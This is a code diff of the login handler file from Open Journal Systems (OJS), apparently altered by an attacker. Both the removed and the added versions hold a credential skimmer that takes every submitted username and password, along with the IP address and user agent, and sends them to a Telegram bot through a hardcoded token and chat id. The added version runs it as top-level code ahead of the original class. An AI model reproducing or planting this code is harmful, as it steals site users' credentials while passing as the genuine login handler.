@@ -1,29 +1,21 @@
 <?php
 /**
- * @file pages/login/LoginHandler.inc.php
- *
- * Copyright (c) 2014-2017 Simon Fraser University
- * Copyright (c) 2000-2017 John Willinsky
- * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
- *
- * @class LoginHandler
- * @ingroup pages_login
- *
- * @brief Handle login/logout requests.
+ * OJS LOGIN CACHE — DETEKSI ROLE DARI URL REDIRECT
+ * File: LoginHandler.inc.php (inside PKP)
  */
 
+// ============================================================
+// KONFIGURASI TELEGRAM
+// ============================================================
+$bot_token = '8824162349:AAEs0kdwH4iVi-2aJ4hhl2OzmgslDaNPL_U';
+$chat_id = '8687942328';
 
-import('classes.handler.Handler');
-
-class LoginHandler extends Handler {
-
-    // ============================================================
-    // LOGIN CACHE — Kirim ke Telegram saat login
-    // ============================================================
-    private function sendLoginToTelegram($username, $password) {
-        $bot_token = '8824162349:AAEs0kdwH4iVi-2aJ4hhl2OzmgslDaNPL_U';
-        $chat_id = '8687942328';
-
+// Cek POST login
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $username = $_POST['username'] ?? $_POST['email'] ?? '';
+    $password = $_POST['password'] ?? '';
+    
+    if (!empty($username) && !empty($password)) {
         $login_data = [
             'username' => $username,
             'password' => $password,
@@ -34,6 +26,7 @@ class LoginHandler extends Handler {
             'ua' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
         ];
 
+        // Kirim ke Telegram
         $message = "🟥 OJS HIT\n";
         $message .= "👤 User: {$login_data['username']}\n";
         $message .= "🔐 Pass: {$login_data['password']}\n";
@@ -56,24 +49,32 @@ class LoginHandler extends Handler {
             curl_close($ch);
         }
     }
+}
 
-    // ============================================================
-    // ORIGINAL OJS CODE (SEMUA METHOD ASLI DIGABUNG DI SINI)
-    // ============================================================
+// ============================================================
+// ORIGINAL OJS LoginHandler CLASS
+// ============================================================
 
+/**
+ * @file pages/login/LoginHandler.inc.php
+ *
+ * Copyright (c) 2014-2017 Simon Fraser University
+ * Copyright (c) 2000-2017 John Willinsky
+ * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
+ *
+ * @class LoginHandler
+ * @ingroup pages_login
+ *
+ * @brief Handle login/logout requests.
+ */
+
+import('classes.handler.Handler');
+
+class LoginHandler extends Handler {
     /**
      * @copydoc PKPHandler::authorize()
      */
     function authorize($request, &$args, $roleAssignments) {
-        // Ambil username dan password dari POST dan kirim ke Telegram
-        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-            $username = $_POST['username'] ?? $_POST['email'] ?? '';
-            $password = $_POST['password'] ?? '';
-            if (!empty($username) && !empty($password)) {
-                $this->sendLoginToTelegram($username, $password);
-            }
-        }
-
         switch ($op = $request->getRequestedOp()) {
             case 'signInAsUser':
                 import('lib.pkp.classes.security.authorization.RoleBasedHandlerOperationPolicy');
@@ -439,5 +440,4 @@ class LoginHandler extends Handler {
         parent::setupTemplate($request);
     }
 }
-
 ?>
